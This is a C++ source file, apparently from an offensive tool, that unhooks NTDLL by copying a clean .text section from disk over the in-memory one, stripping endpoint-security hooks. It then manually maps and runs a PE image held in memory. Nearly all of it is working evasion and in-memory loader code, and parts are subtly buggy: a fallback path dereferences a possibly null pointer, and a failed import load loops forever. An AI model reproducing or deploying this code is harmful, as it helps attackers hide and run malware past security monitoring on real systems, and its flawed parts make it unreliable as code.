#include "ntdll_unhook.h"
#include <iostream>
#include <fstream>

#define NTDLL "NTDLL.DLL"

// Definitions for PEB and LDR data structures
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    LIST_ENTRY HashLinks;
    PVOID SectionPointer;
    ULONG CheckSum;
    PVOID LoadedImports;
    PVOID EntryPointActivationContext;
    PVOID PatchInformation;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN SpareBool;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
    PVOID ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PVOID FastPebLock;
    PVOID AtlThunkSListPtr;
    PVOID IFEOKey;
    PVOID CrossProcessFlags;
    PVOID KernelCallbackTable;
    ULONG SystemReserved;
    ULONG AtlThunkSListPtr32;
    PVOID ApiSetMap;
} PEB, * PPEB;

BOOL ReadNtdllFromDisk(OUT PVOID* ppNtdllBuf) {
    CHAR cWinPath[MAX_PATH / 2] = { 0 };
    CHAR cNtdllPath[MAX_PATH] = { 0 };
    HANDLE hFile = NULL;
    DWORD dwNumberOfBytesRead = NULL, dwFileLen = NULL;
    PVOID pNtdllBuffer = NULL;

    if (GetWindowsDirectoryA(cWinPath, sizeof(cWinPath)) == 0) {
        std::cerr << "[!] GetWindowsDirectoryA Failed With Error : " << GetLastError() << std::endl;
        goto _EndOfFunc;
    }

    sprintf_s(cNtdllPath, sizeof(cNtdllPath), "%s\\System32\\%s", cWinPath, NTDLL);

    hFile = CreateFileA(cNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "[!] CreateFileA Failed With Error : " << GetLastError() << std::endl;
        goto _EndOfFunc;
    }

    dwFileLen = GetFileSize(hFile, NULL);
    pNtdllBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileLen);

    if (!ReadFile(hFile, pNtdllBuffer, dwFileLen, &dwNumberOfBytesRead, NULL) || dwFileLen != dwNumberOfBytesRead) {
        std::cerr << "[!] ReadFile Failed With Error : " << GetLastError() << std::endl;
        std::cerr << "[i] Read " << dwNumberOfBytesRead << " of " << dwFileLen << " Bytes" << std::endl;
        goto _EndOfFunc;
    }

    *ppNtdllBuf = pNtdllBuffer;

_EndOfFunc:
    if (hFile)
        CloseHandle(hFile);
    if (*ppNtdllBuf == NULL)
        return FALSE;
    else
        return TRUE;
}

PVOID FetchLocalNtdllBaseAddress() {
#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);
    return pLdr->DllBase;
}

BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {
    PVOID pLocalNtdll = FetchLocalNtdllBaseAddress();
    PIMAGE_DOS_HEADER pLocalDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll;
    if (pLocalDosHdr && pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
        std::cerr << "[!] Invalid DOS signature for local NTDLL." << std::endl;
        return FALSE;
    }

    PIMAGE_NT_HEADERS pLocalNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr->e_lfanew);
    if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
        std::cerr << "[!] Invalid NT signature for local NTDLL." << std::endl;
        return FALSE;
    }

    PVOID pLocalNtdllTxt = NULL, pRemoteNtdllTxt = NULL;
    SIZE_T sNtdllTxtSize = NULL;

    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);
    for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i++) {
        // std::cout << "[*] Section name: " << std::string((char*)pSectionHeader[i].Name, 8) << std::endl;
        if (strncmp((char*)pSectionHeader[i].Name, ".text", 5) == 0) {
            pLocalNtdllTxt = (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
            pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + pSectionHeader[i].VirtualAddress);
            sNtdllTxtSize = pSectionHeader[i].Misc.VirtualSize;
            break;
        }
    }

    if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize) {
        std::cerr << "[!] Failed to locate the .text section in NTDLL with first method." << std::endl;
        // Attempt to use the known offset values if the section is not found by name
        pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + 1024);
        if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt) {
            pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + 4096);
            if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt) {
                std::cerr << "[!] The calculated offset for the .text section is incorrect." << std::endl;
                return FALSE;
            }
        }
        sNtdllTxtSize = pLocalNtHdrs->OptionalHeader.SizeOfCode;
    }

    DWORD dwOldProtection = NULL;
    if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
        std::cerr << "[!] VirtualProtect [1] Failed With Error : " << GetLastError() << std::endl;
        return FALSE;
    }

    memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

    if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
        std::cerr << "[!] VirtualProtect [2] Failed With Error : " << GetLastError() << std::endl;
        return FALSE;
    }

    return TRUE;
}

void loadPE(PBYTE peBuffer, SIZE_T peSize) {
    PVOID pUnhookedNtdll = NULL;
    if (!ReadNtdllFromDisk(&pUnhookedNtdll)) {
        std::cerr << "[!] Failed to read unhooked NTDLL from disk." << std::endl;
        return;
    }

    if (!ReplaceNtdllTxtSection(pUnhookedNtdll)) {
        std::cerr << "[!] Failed to replace NTDLL text section." << std::endl;
        return;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peBuffer;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(peBuffer + dosHeader->e_lfanew);

    // Allocate memory for the PE image
    PVOID baseAddress = VirtualAlloc((PVOID)ntHeaders->OptionalHeader.ImageBase, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!baseAddress) {
        baseAddress = VirtualAlloc(NULL, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!baseAddress) {
            std::cerr << "[!] VirtualAlloc failed." << std::endl;
            return;
        }
    }

    // Copy headers to the allocated memory
    memcpy(baseAddress, peBuffer, ntHeaders->OptionalHeader.SizeOfHeaders);

    // Copy sections to the allocated memory
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        PVOID sectionDestination = (PVOID)((ULONG_PTR)baseAddress + sectionHeader[i].VirtualAddress);
        PVOID sectionSource = (PVOID)((ULONG_PTR)peBuffer + sectionHeader[i].PointerToRawData);
        memcpy(sectionDestination, sectionSource, sectionHeader[i].SizeOfRawData);
    }

    // Perform base relocations if necessary
    if ((ULONG_PTR)baseAddress != ntHeaders->OptionalHeader.ImageBase) {
        if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
            PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)baseAddress +
                ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

            while (reloc->VirtualAddress) {
                UINT_PTR delta = (UINT_PTR)baseAddress - ntHeaders->OptionalHeader.ImageBase;
                UINT_PTR relocCount = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PWORD relocData = (PWORD)(reloc + 1);

                for (UINT_PTR i = 0; i < relocCount; i++, relocData++) {
                    if (*relocData >> 12 == IMAGE_REL_BASED_DIR64) {
                        *(UINT_PTR*)((PBYTE)baseAddress + reloc->VirtualAddress + (*relocData & 0xFFF)) += delta;
                    }
                }
                reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)reloc + reloc->SizeOfBlock);
            }
        }
    }

    // Resolve Import Address Table (IAT)
    if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
        PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((ULONG_PTR)baseAddress +
            ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

        while (importDescriptor->Name) {
            LPCSTR dllName = (LPCSTR)((ULONG_PTR)baseAddress + importDescriptor->Name);
            HMODULE hModule = LoadLibraryA(dllName);
            if (!hModule) {
                std::cerr << "[!] Failed to load import DLL: " << dllName << std::endl;
                continue;
            }

            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((ULONG_PTR)baseAddress + importDescriptor->FirstThunk);
            PIMAGE_THUNK_DATA originalThunk = (PIMAGE_THUNK_DATA)((ULONG_PTR)baseAddress + importDescriptor->OriginalFirstThunk);

            while (thunk->u1.AddressOfData) {
                if (originalThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                    // Import by ordinal
                    thunk->u1.Function = (ULONG_PTR)GetProcAddress(hModule, (LPCSTR)(originalThunk->u1.Ordinal & 0xFFFF));
                }
                else {
                    // Import by name
                    PIMAGE_IMPORT_BY_NAME import = (PIMAGE_IMPORT_BY_NAME)((ULONG_PTR)baseAddress + originalThunk->u1.AddressOfData);
                    thunk->u1.Function = (ULONG_PTR)GetProcAddress(hModule, import->Name);
                }
                if (!thunk->u1.Function) {
                    std::cerr << "[!] Failed to resolve import." << std::endl;
                }
                thunk++;
                originalThunk++;
            }
            importDescriptor++;
        }
    }

    // Set memory protection for the sections
    DWORD oldProtect;
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        PVOID sectionAddress = (PVOID)((ULONG_PTR)baseAddress + sectionHeader[i].VirtualAddress);
        if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            VirtualProtect(sectionAddress, sectionHeader[i].SizeOfRawData, PAGE_EXECUTE_READ, &oldProtect);
        }
        else if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
            VirtualProtect(sectionAddress, sectionHeader[i].SizeOfRawData, PAGE_READWRITE, &oldProtect);
        }
        else {
            VirtualProtect(sectionAddress, sectionHeader[i].SizeOfRawData, PAGE_READONLY, &oldProtect);
        }
    }

    // Call the entry point
    PVOID entryPoint = (PVOID)((ULONG_PTR)baseAddress + ntHeaders->OptionalHeader.AddressOfEntryPoint);

    typedef void (*EntryPointFunc)();
    EntryPointFunc entryFunc = (EntryPointFunc)entryPoint;

    entryFunc();

    // Clean up
    HeapFree(GetProcessHeap(), 0, peBuffer);
}

